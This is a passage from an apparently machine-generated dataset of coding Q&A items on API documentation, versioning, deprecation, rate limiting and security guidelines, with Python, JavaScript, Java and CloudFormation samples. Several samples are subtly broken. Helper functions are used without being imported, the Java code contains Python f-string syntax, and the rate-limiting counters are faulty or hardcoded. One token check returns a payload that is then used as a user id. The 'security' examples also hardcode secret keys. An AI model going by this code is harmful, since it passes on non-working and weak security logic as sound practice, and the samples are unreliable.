str\n\n@app.post(\"/users\")\nasync def create_user(user: User):\n    if not user.name:\n        raise HTTPException(status_code=400, detail=\"Name is required\")\n    # Save user to the database\n    return user\n```\n\nFinally, use a tool like `Redoc` or `Swagger UI` to display the generated OpenAPI spec as a user-friendly documentation:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>API Documentation</title>\n    <script src=\"https://cdn.jsdelivr.net/npm/redoc@next/bundles/redoc.standalone.js\"></script>\n</head>\n<body>\n    <redoc spec-url=\"/openapi.json\"></redoc>\n</body>\n</html>\n```\n\nThe API server should serve the OpenAPI spec at `/openapi.json`, and the HTML file will render the documentation. The documentation will be automatically updated as the API code changes.\n\nQuestion 2: Implement a fully-featured API documentation system that supports real-time testing, code generation for popular programming languages, and version control for multiple API versions, while also providing visualizations of API relationships and performance metrics.\n\n**Concept**: API Documentation, Real-time Testing, Code Generation, Version Control, API Relationships, Performance Metrics\n\n**Solution**: For this problem, we can build a custom API documentation platform using Node.js, Express, and a frontend framework like React. We'll utilize tools like Swagger UI for testing, OpenAPI Generator for code generation, Git for version control, and a graph visualization library like D3.js.\n\n1. Create an Express app to host the API documentation, integrating Swagger UI for testing:\n\n```javascript\nconst express = require('express');\nconst swaggerUi = require('swagger-ui-express');\nconst swaggerDocument = require('./swagger.json');\n\nconst app = express();\napp.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument));\n\napp.listen(3000, () => {\n  console.log('API documentation is running on port 3000');\n});\n```\n\n1. Implement a version control system using Git to manage different API versions. Whenever a new version is pushed, update the Swagger document accordingly.\n\n2. For code generation, use OpenAPI Generator CLI to generate client libraries for popular programming languages:\n\n```bash\nnpx @openapitools/openapi-generator-cli generate -i swagger.json -g [language] -o generated/code\n```\n\n3. Build a React frontend for the documentation platform with features like API relationship visualization using D3.js. Create a graph representing API endpoints and their dependencies.\n\n4. Integrate performance monitoring by collecting metrics like response time, success rates, and resource utilization. You can use tools like Prometheus or Prometheus-Node-Exporter for this.\n\nThis custom platform will provide a complete solution for documenting, testing, and understanding complex APIs, with real-time testing, code generation, version control, and performance metrics."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Versioning and compatibility", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A developer needs to create an API documentation system that supports versioning and ensures compatibility between different versions of the API. The system should allow clients to easily switch between versions and gracefully handle deprecated endpoints.\n\nConcept: API Design, Versioning, Documentation\n\nSolution: Implement a versioning system using URL paths and include compatibility guidelines in the documentation. For example, we can use the `/v1`, `/v2`, etc., in the API endpoint URLs to denote different versions. To ensure compatibility, we can use a deprecation strategy that redirects old endpoints to new ones with a warning header.\n\nExample in Python using Flask:\n\n```python\nfrom flask import Flask, redirect, make_response, request\n\napp = Flask(__name__)\n\ndef get_api_version():\n    version = request.url.split('/')[-2]\n    return version\n\n@app.route('/v1/users', methods=['GET'])\ndef v1_users():\n    # Implementation for version 1\n    pass\n\n@app.route('/v2/users', methods=['GET'])\ndef v2_users():\n    # Implementation for version 2\n    pass\n\n@app.route('/<version>/deprecated-endpoint', methods=['GET'])\ndef handle_deprecated(version):\n    if version == 'v1':\n        response = make_response(redirect('/v2/new-endpoint', code=307))\n        response.headers['Warning'] = '199 - This endpoint is deprecated, please use /v2/new-endpoint'\n        return response\n    elif version == 'v2':\n        return 'New endpoint implementation'\n\nif __name__ == '__main__':\n    app.run()\n```\n\nQuestion 2:\nProblem: A developer must design an API documentation system that tracks changes between API versions and provides a clear migration path for clients. The system should include a changelog for each version and details on how to update client code to remain compatible.\n\nConcept: API Design, Versioning, Documentation, Changelog\n\nSolution: Create a version-specific changelog in the API documentation, detailing the changes made between versions, and provide migration guides to help clients update their code. The documentation should also include a comparison of endpoints, responses, and parameter changes.\n\nExample Markdown documentation structure:\n\n```markdown\n# API Documentation\n\n## Versioning\nOur API uses the following versioning scheme: `/api/v<version>`\n\n### Changelog\n- **v1 to v2 Migration Guide**\n\n  1. Endpoint `/users` has been renamed to `/users/profiles`.\n  2. Parameter `email` is now required for `/login` endpoint.\n  3. Response structure for `/users/profiles` has changed:\n     ```json\n     Old Response:\n     {\n       \"id\": 1,\n       \"name\": \"John Doe\",\n       \"email\": \"john@example.com\"\n     }\n     \n     New Response:\n     {\n       \"user_id\": 1,\n       \"username\": \"johndoe\",\n       \"email\": \"john@example.com\"\n     }\n     ```\n\n  4. Deprecation notice: `/users/settings` will be removed in v3. Please use `/users/profiles/settings` instead.\n\n- **v2 to v3 Migration Guide**\n  ...\n```\n\nFor the complete documentation, this structure can be expanded with more details, such as API reference sections for each version, code snippets, and additional explanations."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Versioning and compatibility", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nIn a large-scale microservices architecture, you're responsible for maintaining a RESTful API that serves multiple clients with different versioning needs. The API has undergone several revisions, and now you need to implement a backward-compatible versioning strategy while ensuring efficient resource handling and minimal disruption to existing clients. Create a complex versioning scheme using content negotiation, URL paths, and query parameters, and demonstrate how to handle multiple versions with a single backend server.\n\n**Concept: RESTful API, Versioning, Content Negotiation, URL Paths, Query Parameters**\n\n```python\nfrom flask import Flask, request, jsonify\nfrom flask_limiter import Limiter\nfrom werkzeug.routing import Rule\n\napp = Flask(__name__)\nlimiter = Limiter(app, key_func=get_remote_address)\n\napi_versions = {\"v1\": \"/v1\", \"v2\": \"/v2\"}\n\n@app.route('/<version>/<resource>', defaults={'query': None}, methods=['GET', 'POST'])\n@app.route('/<version>/<resource>/<query>', methods=['GET', 'POST'])\n@limiter.limit(\"10/minute\")  # Rate limiting example\ndef handle_request(version, resource, query):\n    try:\n        # Map the version to the correct base path\n        base_path = api_versions[version]\n    except KeyError:\n        return jsonify({\"error\": \"Invalid API version\"}), 400\n\n    # Content negotiation example: Check for 'Accept' header\n    accept_header = request.headers.get('Accept')\n    if accept_header and 'application/vnd.example.com+v2' in accept_header:\n        version = 'v2'\n    else:\n        version = 'v1'\n\n    # Perform version-specific handling\n    if version == 'v1':\n        # Code for handling v1 requests\n        pass\n    elif version == 'v2':\n        # Code for handling v2 requests\n        pass\n    else:\n        return jsonify({\"error\": \"Unsupported API version\"}), 406\n\n    # Return appropriate response based on the version and request\n    return jsonify({\"version\": version, \"resource\": resource, \"query\": query})\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n```\n\nQuestion 2:\nSuppose you're working on an API that has millions of daily requests from various clients, and you need to introduce a new version while maintaining backward compatibility. You must also ensure that old versions of the API are gradually phased out, and resources are efficiently allocated between different versions. Design a system that handles versioning, load balancing, and deprecation of old versions using API Gateway, Lambda functions, and DynamoDB.\n\n**Concept: API Gateway, Lambda, DynamoDB, Load Balancing, Deprecation**\n\n```yaml\n# AWS CloudFormation template (YAML) for setting up API Gateway, Lambda, and DynamoDB\n\nResources:\n  ApiGatewayRestApi:\n    Type: AWS::ApiGateway::RestApi\n    Properties:\n      Name: MultiVersionAPI\n\n  ApiGatewayResourceV1:\n    Type: AWS::ApiGateway::Resource\n    Properties:\n      ParentId: !GetAtt ApiGatewayRestApi.RootResourceId\n      PathPart: v1\n      RestApiId: !Ref ApiGatewayRestApi\n\n  ApiGatewayResourceV2:\n    Type: AWS::ApiGateway::Resource\n    Properties:\n      ParentId: !GetAtt ApiGatewayRestApi.RootResourceId\n      PathPart: v2\n      RestApiId: !Ref ApiGatewayRestApi\n\n  LambdaFunctionV1:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code: !Sub s3://${S3Bucket}/lambda-v1.zip\n      Handler: index.handler\n      Role: !GetAtt LambdaExecutionRole.Arn\n      Runtime: nodejs14.x\n\n  LambdaFunctionV2:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code: !Sub s3://${S3Bucket}/lambda-v2.zip\n      Handler: index.handler\n      Role: !GetAtt LambdaExecutionRole.Arn\n      Runtime: nodejs14.x\n\n  ApiGatewayDeploymentV1:\n    Type: AWS::ApiGateway::Deployment\n    DependsOn:\n      - ApiGatewayResourceV1\n      - LambdaFunctionV1\n    Properties:\n      RestApiId: !Ref ApiGatewayRestApi\n      StageName: v1\n\n  ApiGatewayDeploymentV2:\n    Type: AWS::ApiGateway::Deployment\n    DependsOn:\n      - ApiGatewayResourceV2\n      - LambdaFunctionV2\n    Properties:\n      RestApiId: !Ref ApiGatewayRestApi\n      StageName: v2\n\n  LambdaExecutionRole:\n    Type: AWS::IAM::Role\n    Properties:\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: lambda.amazonaws.com\n            Action: sts:AssumeRole\n      Policies:\n        - PolicyName: LambdaExecutionPolicy\n          PolicyDocument:\n            Version: '2012-10-17'\n            Statement:\n              - Effect: Allow\n                Action:\n                  - logs:CreateLogGroup\n                  - logs:CreateLogStream\n                  - logs:PutLogEvents\n                Resource: 'arn:aws:logs:*:*:*'\n\n  DynamoDBTable:\n    Type: AWS::DynamoDB::Table\n    Properties:\n      AttributeDefinitions:\n        - AttributeName: version\n          AttributeType: S\n        - AttributeName: requestCount\n          AttributeType: N\n      KeySchema:\n        - AttributeName: version\n          KeyType: HASH\n      ProvisionedThroughput:\n        ReadCapacityUnits: 5\n        WriteCapacityUnits: 5\n      TableName: APIUsageTracker\n\n  ApiGatewayUsagePlan:\n    Type: AWS::ApiGateway::UsagePlan\n    Properties:\n      ApiStages:\n        - ApiId: !Ref ApiGatewayRestApi\n          Stage: v1\n      Description: Usage plan for API version 1\n      Quota:\n        Limit: 100000\n        Period: MONTH\n      Throttle:\n        BurstLimit: 100\n        RateLimit: 100\n\n  ApiGatewayUsagePlanKey:\n    Type: AWS::ApiGateway::UsagePlanKey\n    Properties:\n      KeyId: !Ref APIKey\n      KeyType: API_KEY\n      UsagePlanId: !Ref ApiGatewayUsagePlan\n\n```\n\nThese examples demonstrate a complex versioning strategy using different methods and a system for managing API versions, load balancing, and deprecation using AWS services. Note that the actual implementation logic for Lambda functions is not included, as it would depend on the specific functionality of the API."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Deprecation policy", "Complexity_Level": "medium", "Response": "Question 1:\nMedium difficulty problem: Design a deprecation policy for a REST API and create a script to automatically generate documentation that highlights deprecated endpoints.\n\nConcept: API Documentation, RESTful API\n\nSolution:\nThe deprecation policy should include clear guidelines for when and how endpoints will be deprecated, as well as a plan for communicating these changes to API consumers. In this example, we'll use Python and the `flask` library to create a simple REST API and use `sphinx` for documentation generation.\n\n```python\n# app.py\nfrom flask import Flask, jsonify, make_response\n\napp = Flask(__name__)\n\n# Old endpoint\n@app.route('/v1/users', methods=['GET'])\ndef get_users_v1():\n    # Implementation\n    pass\n\n# New endpoint\n@app.route('/v2/users', methods=['GET'])\ndef get_users_v2():\n    # Implementation\n    pass\n\n@app.route('/v1/users', methods=['POST'])\ndef create_user_v1():\n    # Deprecation notice\n    response = make_response(jsonify(message=\"This endpoint is deprecated. Please use /v2/users instead.\"), 410)\n    response.headers['Deprecation-Notification'] = \"true\"\n    return response\n\n# Deprecation policy:\n# - Endpoints are marked with HTTP status 410 (Gone)\n# - Deprecation notification header is set\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nFor generating documentation:\n\n```bash\n# requirements.txt\nSphinx==4.4.0\nsphinxcontrib-httpdomain==1.8.0\n\n# docs/conf.py\nextensions = ['sphinxcontrib.httpdomain']\n\nhttpdomain_manual = True\nhttpdomain_server = 'http://localhost:5000'\n\n# docs/source/api.rst\nAPI Documentation\n=================\n\n.. http:get:: /v1/users\n\n   (Deprecated) Get users. Use ``/v2/users`` instead.\n\n   :status 410: Endpoint is deprecated.\n\n.. http:post:: /v1/users\n\n   (Deprecated) Create a user. Use ``/v2/users`` instead.\n\n   :status 410: Endpoint is deprecated.\n\n.. http:get:: /v2/users\n\n   Get users.\n\n   :status 200: Successful response.\n\n# Generate documentation\n$ pip install -r requirements.txt\n$ sphinx-apidoc -o docs/source/ app.py\n$ cd docs\n$ make html\n```\n\nThis solution demonstrates how to implement a deprecation policy by returning a 410 HTTP status code and a custom header. The `sphinx` documentation is created to indicate which endpoints are deprecated with appropriate messages.\n\nQuestion 2:\nMedium difficulty problem: Write a script in JavaScript to manage a deprecation policy for a GraphQL API, and generate API documentation using `apollo-server` and `graphql-docs`.\n\nConcept: API Documentation, GraphQL API\n\nSolution:\n```javascript\n// schema.js\nconst { gql } = require('apollo-server');\n\nconst typeDefs = gql`\n  type User {\n    id: ID!\n    name: String!\n  }\n\n  type Query {\n    usersV1: [User!]! @deprecated(reason: \"Use usersV2 instead\")\n    usersV2: [User!]!\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    async usersV1(_parent, _args, _context, _info) {\n      // Deprecation notice\n      throw new Error('This endpoint is deprecated. Please use usersV2 instead.');\n    },\n    async usersV2(_parent, _args, _context, _info) {\n      // Implementation\n    },\n  },\n};\n\nmodule.exports = { typeDefs, resolvers };\n```\n\nFor generating documentation:\n\n```javascript\n// apidocs.js\nconst { printSchema } = require('graphql');\nconst fs = require('fs');\n\nconst schema = require('./schema');\n\nconst schemaString = printSchema(schema.typeDefs);\n\nfs.writeFileSync('./schema.graphql', schemaString);\n\n// Install dependencies\n// $ npm install graphql-tools makeExecutableSchema graphql-docs\n\n// Generate documentation\n// $ npx graphql-docs generate --schema schema.graphql --output docs/api-reference.graphql\n```\n\nIn this solution, we use the `@deprecated` directive in the GraphQL schema to indicate the deprecation of the `usersV1` query. An error is thrown in the resolver for `usersV1` to ensure that API consumers are aware of the deprecation. The `graphql-docs` package is used to generate documentation based on the schema."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Deprecation policy", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a comprehensive deprecation policy and automation system for a RESTful API that gracefully handles deprecated endpoints, provides clients with an appropriate migration path, and logs all deprecated requests for auditing purposes. Implement this using Python and Flask.\n\nSolution:\n```python\nfrom flask import Flask, jsonify, request, make_response\nfrom flask_limiter import Limiter\nfrom flask.logging import default_handler\nimport logging\nimport json\n\napp = Flask(__name__)\nlimiter = Limiter(app, key_func=get_remote_address)\n\n# Define the deprecation policy\nDEPRECATION_POLICY = {\n    '/v1/old_endpoint': {\n        'replacement': '/v2/new_endpoint',\n        'deprecated_since': '2023-03-01',\n        'retirement_date': '2023-06-01',\n        'log_handler': log_deprecated_request\n    }\n}\n\n# Custom logging function for deprecated requests\ndef log_deprecated_request(endpoint, request_data):\n    log_message = f\"Deprecated request for endpoint {endpoint}. Request data: {request_data}\"\n    logging.warning(log_message)\n\n@app.route('/v1/old_endpoint', methods=['GET'])\n@limiter.limit('10/minute')  # Limit deprecated endpoint requests\ndef handle_old_endpoint():\n    if DEPRECATION_POLICY.get(request.url_rule.rule):\n        replacement, deprecated_since, retirement_date = DEPRECATION_POLICY[request.url_rule.rule]['replacement'], DEPRECATION_POLICY[request.url_rule.rule]['deprecated_since'], DEPRECATION_POLICY[request.url_rule.rule]['retirement_date']\n        response_data = {\n            'message': f\"This endpoint is deprecated since {deprecated_since} and will be retired on {retirement_date}. Please use {replacement} instead.\",\n            'deprecated': True\n        }\n        response = make_response(jsonify(response_data), 410)  # Return 410 Gone status\n        DEPRECATION_POLICY[request.url_rule.rule]['log_handler'](request.url_rule.rule, request.get_json())\n        return response\n    else:\n        return \"Invalid endpoint\"\n\nif __name__ == '__main__':\n    app.config['PROPAGATE_EXCEPTIONS'] = True\n    app.config['DEBUG'] = True\n    app.logger.setLevel(logging.WARNING)\n    default_handler.setLevel(logging.WARNING)\n\n    app.run()\n```\nIn this solution, a deprecation policy is defined as a dictionary `DEPRECATION_POLICY`. Each deprecated endpoint is associated with its replacement, deprecation and retirement dates, and a logging function. The `handle_old_endpoint` function checks if the current endpoint is deprecated and follows the policy accordingly. If deprecated, it returns a 410 Gone status with an appropriate message and logs the request using the `log_deprecated_request` function.\n\nQuestion 2: Implement a real-time monitoring and alerting system for deprecated API endpoints in a large-scale distributed application. The system should notify the development team when deprecated endpoints are accessed and track the frequency of usage. Use Java with Spring Boot and integrate it with Prometheus and Grafana.\n\nSolution:\n```java\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RestController;\nimport io.prometheus.client.Counter;\n\n@SpringBootApplication\npublic class ApiDeprecationMonitoringApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ApiDeprecationMonitoringApplication.class, args);\n    }\n\n}\n\n@RestController\nclass DeprecatedEndpointsController {\n\n    private static final Counter deprecatedEndpointCounter = Counter.build()\n            .name(\"deprecated_endpoint_hits\")\n            .labelNames(\"endpoint\")\n            .help(\"Number of hits on deprecated API endpoints\")\n            .register();\n\n    @Autowired\n    public DeprecatedEndpointsController() {}\n\n    @GetMapping(\"/v1/old_endpoint\")\n    public String handleOldEndpoint(@PathVariable Map<String, String> params) {\n        deprecatedEndpointCounter.labels(\"/v1/old_endpoint\").inc();\n        notifyDevelopmentTeam(\"/v1/old_endpoint\");\n        return \"Deprecated endpoint. Please migrate to the new endpoint.\";\n    }\n\n    private void notifyDevelopmentTeam(String endpoint) {\n        // Implement real-time notification logic (e.g., Slack, email, or a custom webhook)\n        // based on the frequency of deprecated endpoint usage.\n        // For simplicity, we log the notification here.\n        System.out.println(f\"ALERT: Deprecated endpoint {endpoint} accessed. Notify the development team.\");\n    }\n}\n```\nIn this solution, a Spring Boot application is created with a single deprecated endpoint `/v1/old_endpoint`. We use the Prometheus Counter to track the number of hits on the deprecated endpoint. The `deprecatedEndpointCounter.labels(\"/v1/old_endpoint\").inc();` increments the counter for the specific endpoint. The `notifyDevelopmentTeam` function simulates an alerting mechanism, which should be customized to send real-time notifications based on the configured threshold for deprecated endpoint usage.\n\nTo integrate with Prometheus and Grafana, you would need to add the necessary dependencies, expose a Prometheus metrics endpoint in your application, and set up Grafana to visualize the metrics."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Rate limits", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Design a RESTful API with rate limiting using the Flask framework in Python. The API should restrict the number of requests a client can make within a specific time frame.\n\n```python\nfrom flask import Flask, request, jsonify\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\n\napp = Flask(__name__)\nlimiter = Limiter(app, key_func=get_remote_address, default_limits=[\"100 per day\", \"10 per hour\"])\n\n@app.route('/api/data', methods=['GET'])\n@limiter.limit(\"5 per minute\")\ndef get_data():\n    return jsonify({\"message\": \"Data retrieved successfully.\"})\n\nif __name__ == '__main__':\n    app.run()\n```\nConcept: \"Web Development\", \"APIs\", \"Backend Development\"\n\nResponse: The example above demonstrates a RESTful API endpoint `/api/data` that allows GET requests. The Flask-Limiter library is used to enforce rate limiting. In this case, a client is restricted to make a maximum of 5 requests per minute. If the limit is exceeded, the client will receive a 429 Too Many Requests response. The `key_func` parameter ensures that rate limits are enforced based on the client's IP address.\n\nQuestion 2:\nProblem: Implement a custom rate limiter in a Node.js Express application using Redis as a storage backend. The rate limiter should track requests per user ID and have a limit of 100 requests per hour.\n\n```javascript\nconst express = require('express');\nconst redis = require('redis');\nconst client = redis.createClient();\nconst app = express();\n\napp.use((req, res, next) => {\n  const userId = req.headers['x-user-id'] || 'unknown';\n  const key = `rate_limit:${userId}`;\n  \n  client.get(key, (err, reply) => {\n    if (err) throw err;\n    if (reply) {\n      const remainingRequests = 100 - parseInt(reply);\n      if (remainingRequests <= 0) {\n        res.status(429).send('Too Many Requests');\n      } else {\n        req.remaining = remainingRequests;\n        req.limit = 100;\n        next();\n      }\n    } else {\n      next();\n    }\n  });\n});\n\napp.use((req, res, next) => {\n  const userId = req.headers['x-user-id'] || 'unknown';\n  const key = `rate_limit:${userId}`;\n  \n  client.multi()\n    .incr(key)\n    .expire(key, 3600) // 1 hour expiration\n    .exec((err, replies) => {\n      if (err) throw err;\n      req.limit = replies[1];\n      req.remaining = req.limit - replies[0];\n      next();\n    });\n});\n\napp.get('/api/data', (req, res) => {\n  res.json({ message: 'Data retrieved successfully.' });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\nConcept: \"Web Development\", \"APIs\", \"Backend Development\", \"Database Management\" (Redis)"}, {"L2_TASK": "Create API documentation", "L3_TASK": "Rate limits", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a highly scalable and resilient API gateway that enforces rate limits on a per-user basis with a sliding window algorithm. The gateway should handle millions of requests per second, distribute the load across multiple servers, and provide real-time monitoring of remaining requests and API usage.\n\nConcept: Distributed Systems, Load Balancing, Sliding Window Algorithm\n\nSolution:\nWe can use a combination of Redis, a highly scalable in-memory data store, and a distributed system architecture to achieve this. The API gateway will be composed of multiple instances that communicate with Redis for rate limit storage and retrieval. The sliding window algorithm can be implemented using Redis' `INCR` and `EXPIRE` commands along with Lua scripting for atomic transactions.\n\nExample (using Node.js and the `ioredis` library):\n\n```javascript\nconst Redis = require('ioredis');\nconst express = require('express');\nconst app = express();\n\n// Redis connection\nconst redis = new Redis({\n  host: 'redis_host',\n  port: 6379,\n});\n\n// Rate limit settings\nconst LIMIT = 1000;\nconst PERIOD = 60; // seconds\n\n// Middleware for rate limiting\nasync function rateLimit(req, res, next) {\n  const userId = req.headers['x-user-id'];\n  const key = `rate_limit:${userId}`;\n\n  // Lua script for atomic increment and expiration\n  const script = `\n    local limit = tonumber(ARGV[1])\n    local period = tonumber(ARGV[2])\n    local current = tonumber(redis.call('GET', KEYS[1]))\n    if current then\n      current = current + 1\n      if current > limit then\n        return current - limit + 1\n      end\n      redis.call('EXPIRE', KEYS[1], period)\n    else\n      redis.call('SET', KEYS[1], 1, 'EX', period)\n    end\n    return 0\n  `;\n\n  const remaining = await redis.eval(script, 1, key, LIMIT, PERIOD);\n  if (remaining > 0) {\n    res.status(429).json({ error: 'Rate limit exceeded' });\n  } else {\n    res.set('X-RateLimit-Remaining', '999');\n    res.set('X-RateLimit-Limit', LIMIT);\n    res.set('X-RateLimit-Reset', Math.floor(Date.now() / 1000) + PERIOD);\n    next();\n  }\n}\n\napp.use(rateLimit);\n\napp.get('/api\u8d44\u6e90', (req, res) => {\n  res.json({ message: 'API\u8d44\u6e90\u8bbf\u95ee\u6210\u529f' });\n});\n\napp.listen(3000, () => {\n  console.log('API gateway listening on port 3000');\n});\n```\n\nQuestion 2: Implement a distributed rate-limiting solution using JWT tokens that incorporates multiple API services, each with its own rate limit policy. The solution should seamlessly integrate with the authentication and authorization system, provide granular control over resources, and support hierarchical rate limits.\n\nConcept: JWT, Distributed Systems, Hierarchical Rate Limiting\n\nSolution:\nWe can use a combination of JWT tokens, a central rate limit service, and microservices architecture to achieve this. Each API service will include the rate limit policy in the JWT token claims, and the central rate limit service will enforce these policies across services.\n\nExample (using Python and the `Flask` framework with `pyjwt` and `redis` libraries):\n\n```python\nimport jwt\nimport redis\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\nredis_client = redis.Redis(host='redis_host', port=6379, db=0)\n\n# JWT secret key\nSECRET_KEY = 'your_secret_key'\n\ndef get_rate_limit_from_token(token):\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n        return payload.get('rate_limit', {})\n    except jwt.exceptions.DecodeError:\n        return {}\n\n@app.before_request\ndef rate_limit():\n    jwt_token = request.headers.get('Authorization')\n    if jwt_token:\n        token = jwt_token.split(' ')[1]\n        user_rate_limit = get_rate_limit_from_token(token)\n        user = user_rate_limit.get('user')\n        resource = user_rate_limit.get('resource')\n\n        key = f'rate_limit:{user}:{resource}'\n        remaining = redis_client.decr(key)\n        if remaining < 0:\n            redis_client.incr(key, int(user_rate_limit.get('limit', 1000)))\n            return jsonify({'error': 'Rate limit exceeded'}), 429\n\n        redis_client.expire(key, user_rate_limit.get('period', 60))\n        app.response.headers['X-RateLimit-Remaining'] = remaining\n        app.response.headers['X-RateLimit-Limit'] = user_rate_limit.get('limit', 1000)\n        app.response.headers['X-RateLimit-Reset'] = redis_client.ttl(key)\n\n@app.route('/api\u8d44\u6e90')\ndef api_resource():\n    return jsonify({'message': 'API\u8d44\u6e90\u8bbf\u95ee\u6210\u529f'})\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nIn a real-world scenario, you would replace `'redis_host'` with your Redis server's actual address, and `'your_secret_key'` with a secure secret key for JWT token signing. The JWT token would be generated by the authentication service and include the rate limit policy for the user and resource."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Security guidelines", "Complexity_Level": "medium", "Response": "Question 1: How can you implement proper authentication and authorization for an API using JSON Web Tokens (JWTs) and express-jwt library in a Node.js application, following security guidelines?\n\nSolution:\nTo implement authentication and authorization using JWTs and the `express-jwt` library, follow these steps:\n\n1. Install the required packages:\n```bash\nnpm install jsonwebtoken express-jwt\n```\n1. Create a JWT secret for signing and verifying tokens:\n```javascript\nconst jwtSecret = 'your_secret_key';\n```\n1. Define a function to generate JWT tokens:\n```javascript\nconst generateToken = (userId) => {\n  return jwt.sign({ userId }, jwtSecret, { expiresIn: '1h' }); // Token expires in 1 hour\n};\n```\n1. Create a middleware function to authenticate users:\n```javascript\nconst authenticateUser = (req, res, next) => {\n  try {\n    const token = req.headers['authorization'].split(' ')[1]; // Get token from 'Authorization' header\n    const decoded = jwt.verify(token, jwtSecret);\n    req.user = decoded; // Attach decoded user data to the request\n    next();\n  } catch (err) {\n    res.status(401).json({ error: 'Unauthorized' });\n  }\n};\n```\n1. Define a protected route using the `express-jwt` middleware:\n```javascript\nconst express = require('express');\nconst jwt = require('express-jwt');\n\nconst app = express();\n\napp.use(express.json());\n\n// Protected route with authentication and authorization\napp.get('/protected', jwt({ secret: jwtSecret }), authenticateUser, (req, res) => {\n  res.json({ message: 'Welcome to the protected route!' });\n});\n\napp.listen(3000, () => console.log('Server started on port 3000'));\n```\nIn this example, we use JWTs to authenticate users by verifying the token using the `jsonwebtoken` library. The `express-jwt` middleware is used to handle token validation before reaching the protected route. If the token is invalid or missing, the user will receive a 401 Unauthorized response.\n\nQuestion 2: How can you ensure secure data transmission and implement rate limiting for an API using HTTPS and the `express-rate-limit` library in a Node.js application?\n\nConcept: API Security and Rate Limiting\n\nSolution:\n1. Install the required packages:\n```bash\nnpm install express-rate-limit axios\n```\n1. Enable HTTPS by creating a server with SSL certificate and key:\n```javascript\nconst https = require('https');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('path/to/server.key'),\n  cert: fs.readFileSync('path/to/server.crt'),\n};\n\nconst app = require('express')();\nconst server = https.createServer(options, app);\n```\n1. Implement rate limiting with the `express-rate-limit` middleware:\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // limit each IP to 100 requests per windowMs\n  message: 'Too many requests from this IP, please try again later',\n});\n\n// Apply the rate limiter to all API routes\napp.use('/api', limiter);\n```\n1. Create a simple API route to test the HTTPS and rate limiting:\n```javascript\napp.get('/api/data', (req, res) => {\n  res.json({ message: 'Secure data transmitted successfully' });\n});\n```\n1. Start the server:\n```javascript\nserver.listen(443, () => {\n  console.log('Server is running on port 443');\n});\n```\nIn this solution, we use HTTPS to encrypt data transmission for increased security. The `express-rate-limit` middleware is used to restrict the number of requests an IP address can make to the API within a specific time window. If the limit is exceeded, the client will receive a custom error message."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Security guidelines", "Complexity_Level": "extremely difficult", "Response": "Question 1: Implement a secure API key management system that uses rotating access tokens with a short expiration time, ensuring secure API documentation and preventing unauthorized access. The system should also include rate limiting and IP whitelisting capabilities.\n\nConcept: Security guidelines, API Documentation\n\nSolution:\n```python\nimport jwt\nimport time\nfrom flask import Flask, request, jsonify, make_response\nfrom flask_limiter import Limiter\nfrom flask_ipwhitelist import IpWhitelist\n\napp = Flask(__name__)\nlimiter = Limiter(app, key_func=get_remote_address)\nip_whitelist = IpWhitelist(app)\n\n# Configure IP whitelisting\nwhitelist = ['192.168.1.1', '10.0.0.2']\nfor ip in whitelist:\n    ip_whitelist.whitelist(ip)\n\n# Secret key for JWT\nJWT_SECRET_KEY = 'super-secret-key'\n\n# Generate a JWT with a short expiration time\ndef generate_access_token(user_id):\n    payload = {'user_id': user_id, 'exp': time.time() + 60}  # Token expires in 1 minute\n    return jwt.encode(payload, JWT_SECRET_KEY, algorithm='HS256').decode('utf-8')\n\n# Verify and decode a JWT\ndef verify_access_token(token):\n    try:\n        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=['HS256'])\n        return payload if not payload.get('exp') < time.time() else None\n    except jwt.exceptions.DecodeError:\n        return None\n\n@app.route('/api', methods=['GET'])\n@limiter.limit(\"10/minute\")  # Limit to 10 requests per minute\n@ip_whitelist.whitelist_required\ndef secure_api():\n    access_token = request.headers.get('Authorization')\n    if access_token:\n        user_id = verify_access_token(access_token)\n        if user_id:\n            # Access granted, process API request\n            return jsonify({'message': 'Access granted, API data processed successfully.'})\n        else:\n            return make_response(jsonify({'error': 'Invalid or expired access token.'}), 401)\n    else:\n        return make_response(jsonify({'error': 'Access token missing.'}), 401)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nQuestion 2: Implement a secure API documentation system using OAuth 2.0 with client credentials grant type, which allows limited access to API resources for third-party applications. The system should include revocation capabilities and enforce strong token security.\n\nConcept: Security guidelines, API Documentation\n\nSolution:\n```python\nfrom flask import Flask, request, jsonify, make_response\nfrom oauthlib.oauth2 import BackendApplicationClient\nfrom requests_oauthlib import OAuth2Session\nimport jwt\nimport time\n\napp = Flask(__name__)\nJWT_SECRET_KEY = 'super-secret-key'\nOAUTH2_CLIENT_ID = 